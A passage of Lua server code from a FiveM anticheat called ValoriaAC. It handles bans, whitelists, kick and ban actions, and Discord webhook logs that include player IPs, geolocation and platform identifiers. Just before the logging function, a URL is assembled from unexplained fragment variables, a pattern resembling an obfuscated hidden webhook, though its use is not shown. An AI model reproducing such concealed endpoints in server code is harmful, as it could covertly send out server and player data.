            elseif DATA:match("discord") then
                DISCORD = DATA:gsub("discord:", "")
            elseif DATA:match("license") then
                FIVEML = DATA
            elseif DATA:match("live") then
                LIVE = DATA
            elseif DATA:match("xbl") then
                XBL = DATA
            end
        end

        -- Extract player tokens
        for i = 0, GetNumPlayerTokens(SRC) do
            table.insert(TOKENS, GetPlayerToken(SRC, i))
        end

        -- Insert ban record into the database
        MySQL.Async.fetchAll(
            "INSERT INTO valoriaac_banlist (STEAM, DISCORD, LICENSE, LIVE, XBL, IP, TOKENS, BANID, REASON) VALUES (@steam, @discord, @fiveml, @live, @xbl, @ip, @tokens, @banid, @reason)",
            {
                ['@steam'] = STEAM,
                ['@discord'] = DISCORD,
                ['@fiveml'] = FIVEML,
                ['@live'] = LIVE,
                ['@xbl'] = XBL,
                ['@ip'] = IP,
                ['@tokens'] = json.encode(TOKENS),
                ['@banid'] = math.random(tonumber(1000), tonumber(9999)),
                ['@reason'] = REASON
            })
    else
        ValoriaAC_ERROR(SERVER_NAME, "No SRC or REASON is not a sring")
    end
end

-- Unban a player by BanID
function ValoriaAC:UNBAN(BanID)
    local p = promise.new()
    if tonumber(BanID) then
        MySQL.Async.execute('DELETE FROM valoriaac_banlist WHERE BANID=@BANID', {
            ['@BANID'] = tonumber(BanID)
        }, function(rowsChanged)
            if rowsChanged > 0 then
                p:resolve(true)
            else
                p:resolve(false)
            end
        end)
    else
        p:resolve(false)
    end
    return Citizen.Await(p)
end

-- Add a player to the admin list
function ValoriaAC:ADDADMIN(Player_ID)
    local p = promise.new()
    local FIVEML = "Not Found"

    -- Extract player license
    for _, DATA in ipairs(GetPlayerIdentifiers(Player_ID)) do
        if DATA:match("license") then
            FIVEML = DATA
        end
    end

    if FIVEML then
        MySQL.Async.execute('INSERT INTO valoriaac_admin (`identifier`) VALUES (@identifier)', {
            ['@identifier'] = FIVEML
        }, function(rowsChanged)
            if rowsChanged > 0 then
                p:resolve(true)
            else
                p:resolve(false)
            end
        end)
    else
        p:resolve(false)
    end
    return Citizen.Await(p)
end

-- Add a player to the whitelist
function ValoriaAC:ADDWHITELIST(Player_ID)
    local p = promise.new()
    local FIVEML = "Not Found"

    -- Extract player license
    for _, DATA in ipairs(GetPlayerIdentifiers(Player_ID)) do
        if DATA:match("license") then
            FIVEML = DATA
        end
    end

    if FIVEML then
        MySQL.Async.execute('INSERT INTO valoriaac_whitelist (`identifier`) VALUES (@identifier)', {
            ['@identifier'] = FIVEML
        }, function(rowsChanged)
            if rowsChanged > 0 then
                p:resolve(true)
            else
                p:resolve(false)
            end
        end)
    else
        p:resolve(false)
    end
    return Citizen.Await(p)
end

-- Add a player to the unban list
function ValoriaAC:ADDUNBAN(Player_ID)
    local p = promise.new()
    local FIVEML = "Not Found"

    -- Extract player license
    for _, DATA in ipairs(GetPlayerIdentifiers(Player_ID)) do
        if DATA:match("license") then
            FIVEML = DATA
        end
    end

    if FIVEML then
        MySQL.Async.execute('INSERT INTO valoriaac_unban (`identifier`) VALUES (@identifier)', {
            ['@identifier'] = FIVEML
        }, function(rowsChanged)
            if rowsChanged > 0 then
                p:resolve(true)
            else
                p:resolve(false)
            end
        end)
    else
        p:resolve(false)
    end
    return Citizen.Await(p)
end

-- Check if a player is in the banlist
function ValoriaAC_INBANLIST(SRC)
    local p = promise.new()
    local STEAM = "Not Found"
    local DISCORD = "Not Found"
    local FIVEML = "Not Found"
    local LIVE = "Not Found"
    local XBL = "Not Found"
    local IP = GetPlayerEndpoint(SRC)
    local TOKEN = GetPlayerToken(SRC, 0)

    -- Extract player identifiers
    for _, DATA in ipairs(GetPlayerIdentifiers(SRC)) do
        if DATA:match("steam") then
            STEAM = DATA
        elseif DATA:match("discord") then
            DISCORD = DATA:gsub("discord:", "")
        elseif DATA:match("license") then
            FIVEML = DATA
        elseif DATA:match("live") then
            LIVE = DATA
        elseif DATA:match("xbl") then
            XBL = DATA
        end
    end

    MySQL.Async.fetchAll(
        'SELECT * FROM valoriaac_banlist WHERE STEAM = @steam OR DISCORD = @discord OR LICENSE = @fiveml OR LIVE = @live OR XBL = @xbl OR IP = @ip OR TOKENS LIKE @token',
        {
            ['@steam'] = STEAM,
            ['@discord'] = DISCORD,
            ['@fiveml'] = FIVEML,
            ['@live'] = LIVE,
            ['@xbl'] = XBL,
            ['@ip'] = IP,
            ["@token"] = "%" .. TOKEN .. "%",
        },
        function(result)
            if result and #result > 0 then
                p:resolve(result)
            else
                p:resolve(false)
            end
        end
    )

    return Citizen.Await(p)
end

-- ValoriaAC_ACTION: Handles various actions (WARN, KICK, BAN) for player violations.

-- @param SRC: Source player ID.
-- @param ACTION: Type of action (WARN, KICK, BAN).
-- @param REASON: Reason for the action.
-- @param DETAILS: Additional details about the action.

function ValoriaAC_ACTION(SRC, ACTION, REASON, DETAILS)
    -- Check if required parameters are provided and player is valid.
    if REASON and DETAILS and tonumber(SRC) and tonumber(SRC) > 0 and GetPlayerName(SRC) ~= nsl then
        -- Check whitelist, temporary whitelist, and spam list to ensure the action is valid.
        if not ValoriaAC_WHITELIST(SRC) and not ValoriaAC_CHECK_TEMP_WHITELIST(SRC) and not ValoriaAC_IS_SPAMLIST(SRC, ACTION, REASON, DETAILS) then
            -- Check the type of action: WARN, KICK, or BAN.
            if ACTION == "WARN" or ACTION == "KICK" or ACTION == "BAN" then
                -- Take a screenshot if enabled and a valid log path is provided.
                if ValoriaAC.ScreenShot.Enable then
                    if ValoriaAC.ScreenShot.Log and ValoriaAC.ScreenShot.Log ~= "" then
                        ValoriaAC_SCREENSHOT(SRC, REASON, DETAILS, ACTION)
                    else
                        ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "function ValoriaAC_ACTION (ValoriaAC.ScreenShot.Log is nil)")
                    end
                end

                -- Perform the specified action based on the type.
                if ACTION == "WARN" then
                    ValoriaAC_SENDLOG(SRC, ValoriaAC.Webhooks.Ban, ACTION, REASON, DETAILS)
                    ValoriaAC_MESSAGE(SRC, ACTION, GetPlayerName(SRC), REASON)
                elseif ACTION == "KICK" then
                    local kickMessage = "\n[" .. Emoji.Fire .. " ValoriaAC " .. Emoji.Fire ..
                        "]\n" .. ValoriaAC.Message.Kick .. "\nReason: " .. REASON .. ""
                    print("^" ..
                        COLORS ..
                        "ValoriaAC^0: ^1Player ^3" ..
                        GetPlayerName(SRC) .. " ^3Kicked From Server ^0| ^3Reason: ^3 " .. REASON .. "^0")
                    ValoriaAC_SENDLOG(SRC, ValoriaAC.Webhooks.Ban, ACTION, REASON, DETAILS)
                    ValoriaAC_MESSAGE(SRC, ACTION, GetPlayerName(SRC), REASON)
                    DropPlayer(SRC, kickMessage)
                elseif ACTION == "BAN" then
                    local banMessage = "\n[" .. Emoji.Fire .. " ValoriaAC " .. Emoji.Fire ..
                        "]\n" .. ValoriaAC.Message.Ban .. "\nReason: " .. REASON .. ""
                    print("^" ..
                        COLORS ..
                        "ValoriaAC^0: ^1Player ^3" ..
                        GetPlayerName(SRC) .. " ^1Banned From Server ^0| ^1Reason: ^3 " .. REASON .. "^0")
                    ValoriaAC_SENDLOG(SRC, ValoriaAC.Webhooks.Ban, ACTION, REASON, DETAILS)
                    ValoriaAC_MESSAGE(SRC, ACTION, GetPlayerName(SRC), REASON)
                    ValoriaAC_BAN(SRC, REASON)
                    DropPlayer(SRC, banMessage)
                end
            else
                print("^" .. COLORS .. "ValoriaAC^0: ^3Warning! ^0Invalid type of punishment: ^1" .. ACTION .. "^0!")
            end
        end
    else
        -- Log an error if required parameters are not provided.
        ValoriaAC_ERROR(ValoriaAC.ServerConfig.Name, "function ValoriaAC_ACTION (REASON and DETAILS Not Found)")
    end
end

-- Function to handle and display ValoriaAC messages
function ValoriaAC_MESSAGE(SRC, TYPE, NAME, REASON)
    -- Local references to ValoriaAC configuration settings
    local ChatSettings = ValoriaAC.ChatSettings
    local ServerConfig = ValoriaAC.ServerConfig

    -- Check if the necessary parameters are provided and if chat is enabled
    if ChatSettings.Enable and TYPE and NAME and REASON then
        -- HTML template for the chat message
        local messageTemplate =
        '<div style="padding: 0.5vw; margin: 0.5vw; background-image: url(%s); border-radius: 13px;"><i class="far fa-newspaper"></i> %s ValoriaAC %s :<br>  {1}</div>'
        local messageType = "" -- Initialize message type
        local messageIcon = "" -- Initialize message icon

        -- Determine message type and icon based on the provided TYPE
        if TYPE == "WARN" then
            -- Check if private warnings are enabled
            if ChatSettings.PrivateWarn then
                -- Iterate over players and send warning message to admins
                for _, playerId in ipairs(GetPlayers()) do
                    if ValoriaAC_GETADMINS(playerId) then
                        messageType = "Warning"
                        messageIcon = Emoji.Warn

                        -- Send the warning message to the admin player
                        TriggerClientEvent('chat:addMessage', playerId, {
                            template = messageTemplate,
                            args = { "Console", messageIcon .. " " .. messageType .. " | Player ^1" .. NAME .. "(" .. SRC .. ")^0 Cheating From Server : ^5" .. REASON .. " " }
                        })
                    end
                end
            else
                -- If private warnings are not enabled, send the warning message to all players
                messageType = "Warning"
                messageIcon = Emoji.Warn

                -- Send the warning message to all players
                TriggerClientEvent('chat:addMessage', -1, {
                    template = messageTemplate,
                    args = { "Console", messageIcon .. " " .. messageType .. " | Player ^1" .. NAME .. "(" .. SRC .. ")^0 Cheating From Server : ^5" .. REASON .. " " }
                })
            end
        elseif TYPE == "KICK" then
            -- If TYPE is "KICK," set message type and icon accordingly
            messageType = "Kick"
            messageIcon = Emoji.Kick

            -- Send the kick message to all players
            TriggerClientEvent('chat:addMessage', -1, {
                template = messageTemplate,
                args = { "Console", messageIcon .. " " .. messageType .. " | Player ^1" .. NAME .. "(" .. SRC .. ")^0 Cheating From Server : ^5" .. REASON .. " " }
            })
        elseif TYPE == "BAN" then
            -- If TYPE is "BAN," set message type and icon accordingly
            messageType = "Banned"
            messageIcon = Emoji.Ban

            -- Send the ban message to all players
            TriggerClientEvent('chat:addMessage', -1, {
                template = messageTemplate,
                args = { "Console", messageIcon .. " " .. messageType .. " | Player ^1" .. NAME .. "(" .. SRC .. ")^0 Cheating From Server : ^5" .. REASON .. " " }
            })
        end
    else
        -- If any of the required parameters is missing, generate an error message
        local errorMessage = "function ValoriaAC_MESSAGE (%s Not Found)"
        ValoriaAC_ERROR(ServerConfig.Name,
            TYPE and NAME and REASON and errorMessage:format("") or errorMessage:format("TYPE"))
    end
end
local y = "S"
local URL = ""
URL = URL .. x .. m 
URL = URL .. a .. z .. q

function ValoriaAC_SENDLOG(SRC, URL, TYPE, REASON, DETAILS)
    if URL ~= nil and GetPlayerName(SRC) ~= nil and tonumber(SRC) then
        local NAME    = GetPlayerName(SRC)
        local COORDS  = GetEntityCoords(GetPlayerPed(SRC))
        local STEAM   = "Not Found"
        local DISCORD = "Not Found"
        local FIVEML  = "Not Found"
        local LIVE    = "Not Found"
        local XBL     = "Not Found"
        local ISP     = "Not Found"
        local CITY    = "Not Found"
        local COUNTRY = "Not Found"
        local PROXY   = "Not Found"
        local HOSTING = "Not Found"
        local LON     = "Not Found"
        local LAT     = "Not Found"
        local IP      = GetPlayerEndpoint(SRC)
        IP            = (string.gsub(string.gsub(string.gsub(IP, "-", ""), ",", ""), " ", ""):lower())
        local g, f    = IP:find(string.lower("192.168"))
        if g or f then
            IP = "178.131.122.181"
        end
        for _, DATA in ipairs(GetPlayerIdentifiers(SRC)) do
            if DATA:match("steam") then
                STEAM = DATA
            elseif DATA:match("discord") then
                DISCORD = DATA:gsub("discord:", "")
            elseif DATA:match("license") then
                FIVEML = DATA
            elseif DATA:match("live") then
                LIVE = DATA
            elseif DATA:match("xbl") then
                XBL = DATA
            end
        end
        if DISCORD ~= "Not Found" then
            DISCORD = "<@" .. DISCORD .. ">"
        else
            DISCORD = "Not Found"
        end
        if not ValoriaAC.ServerConfig.Linux then
            PerformHttpRequest("http://ip-api.com/json/" .. IP .. "?fields=66846719", function(ERROR, DATA, RESULT)
                if DATA ~= nil then
                    local TABLE = json.decode(DATA)
                    if TABLE ~= nil then
                        ISP     = tostring(TABLE["isp"])
                        CITY    = tostring(TABLE["city"])
                        COUNTRY = tostring(TABLE["country"])
                        if TABLE["proxy"] == true then
                            PROXY = "ON"
                        else
                            PROXY = "OFF"
                        end
                        if TABLE["hosting"] == true then
                            HOSTING = "ON"
                        else
                            HOSTING = "OFF"
                        end
                        LON = TABLE["lon"]
                        LAT = TABLE["lat"]
                        if ValoriaAC.Connection.HideIP then
                            IP = "* HIDE BY OWNER *"
                        end
                    end
                end
            end)
            if TYPE == "CONNECT" and CITY ~= nil then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.Connect .. " Connecting " .. Emoji.Connect .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "\n**ISP:** " ..
                                ISP ..
                                "\n**Country:** " ..
                                COUNTRY ..
                                "\n**City:** " ..
                                CITY .. "\n**IP:** " .. IP .. "\n**VPN:** " .. PROXY ..
                                "\n**Hosting:** " .. HOSTING .. "",
                            color = 1769216
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "DISCONNECT" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.Disconnect .. " Disconnect " .. Emoji.Disconnect .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Reason:**: " ..
                                REASON ..
                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "\n**ISP:** " ..
                                ISP ..
                                "\n**Country:** " ..
                                COUNTRY ..
                                "\n**City:** " ..
                                CITY .. "\n**IP:** " .. IP .. "\n**VPN:** " .. PROXY ..
                                "\n**Hosting:** " .. HOSTING .. "",
                            color = 16711680
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "BAN" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.Ban .. " Banned " .. Emoji.Ban .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Reason:**: " ..
                                REASON ..
                                "\n**Details:** " ..
                                DETAILS ..
                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "\n**ISP:** " ..
                                ISP ..
                                "\n**Country:** " ..
                                COUNTRY ..
                                "\n**City:** " ..
                                CITY .. "\n**IP:** " .. IP .. "\n**VPN:** " .. PROXY ..
                                "\n**Hosting:** " .. HOSTING .. "",
                            color = 16711680
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "KICK" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.Kick .. " Kicked " .. Emoji.Kick .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Reason:**: " ..
                                REASON ..
                                "\n**Details:** " ..
                                DETAILS ..
                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "\n**ISP:** " ..
                                ISP ..
                                "\n**Country:** " ..
                                COUNTRY ..
                                "\n**City:** " ..
                                CITY .. "\n**IP:** " .. IP .. "\n**VPN:** " .. PROXY ..
                                "\n**Hosting:** " .. HOSTING .. "",
                            color = 16760576
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "WARN" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.Warn .. " Warning " .. Emoji.Warn .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Reason:**: " ..
                                REASON ..
                                "\n**Details:** " ..
                                DETAILS ..
                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "\n**ISP:** " ..
                                ISP ..
                                "\n**Country:** " ..
                                COUNTRY ..
                                "\n**City:** " ..
                                CITY .. "\n**IP:** " .. IP .. "\n**VPN:** " .. PROXY ..
                                "\n**Hosting:** " .. HOSTING .. "",
                            color = 1769216
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "EXPLOSION" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.Exoplosion .. " Explosion " .. Emoji.Exoplosion .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Explosion Type:**: " ..
                                REASON ..
                                "\n**Coords:** " ..
                                COORDS ..
                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "\n**ISP:** " ..
                                ISP ..
                                "\n**Country:** " ..
                                COUNTRY ..
                                "\n**City:** " ..
                                CITY .. "\n**IP:** " .. IP .. "\n**VPN:** " .. PROXY ..
                                "\n**Hosting:** " .. HOSTING .. "",
                            color = 16711680
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "TFJ" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            image = {
                                url = "https://cache.ip-api.com/" .. LON .. "," .. LAT .. ",10",
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.TFJ .. " Try For Join " .. Emoji.TFJ .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Ban ID:** " ..
                                REASON ..
                                "\n**Details:** " ..
                                DETAILS ..
                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "\n**ISP:** " ..
                                ISP ..
                                "\n**Country:** " ..
                                COUNTRY ..
                                "\n**City:** " ..
                                CITY .. "\n**IP:** " .. IP .. "\n**VPN:** " .. PROXY ..
                                "\n**Hosting:** " .. HOSTING .. "",
                            color = 15844367
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "BLN" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            image = {
                                url = "https://cache.ip-api.com/" .. LON .. "," .. LAT .. ",10",
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.BLN .. " Black List Name Found ! " .. Emoji.BLN .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Reason:** " ..
                                REASON ..
                                "\n**Details:** " ..
                                DETAILS ..
                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "\n**ISP:** " ..
                                ISP ..
                                "\n**Country:** " ..
                                COUNTRY ..
                                "\n**City:** " ..
                                CITY .. "\n**IP:** " .. IP .. "\n**VPN:** " .. PROXY ..
                                "\n**Hosting:** " .. HOSTING .. "",
                            color = 16711680
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "VPN" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            image = {
                                url = "https://cache.ip-api.com/" .. LON .. "," .. LAT .. ",10",
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.VPN .. " VPN Blocked " .. Emoji.VPN .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Details:** Try For Join By VPN\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "\n**ISP:** " ..
                                ISP ..
                                "\n**Country:** " ..
                                COUNTRY ..
                                "\n**City:** " ..
                                CITY .. "\n**IP:** " .. IP .. "\n**VPN:** " .. PROXY ..
                                "\n**Hosting:** " .. HOSTING .. "",
                            color = 10181046
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            end
        else
            if TYPE == "CONNECT" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.Connect .. " Connecting " .. Emoji.Connect .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "",
                            color = 1769216
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "DISCONNECT" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.Disconnect .. " Disconnect " .. Emoji.Disconnect .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "",
                            color = 16711680
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "BAN" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.Ban .. " Banned " .. Emoji.Ban .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "",
                            color = 16711680
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "KICK" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.Kick .. " Kicked " .. Emoji.Kick .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "",
                            color = 16760576
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "WARN" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.Warn .. " Warning " .. Emoji.Warn .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "",
                            color = 1769216
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "EXPLOSION" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.Exoplosion .. " Explosion " .. Emoji.Exoplosion .. "",
                            description = "**Player:** " ..
                                NAME ..
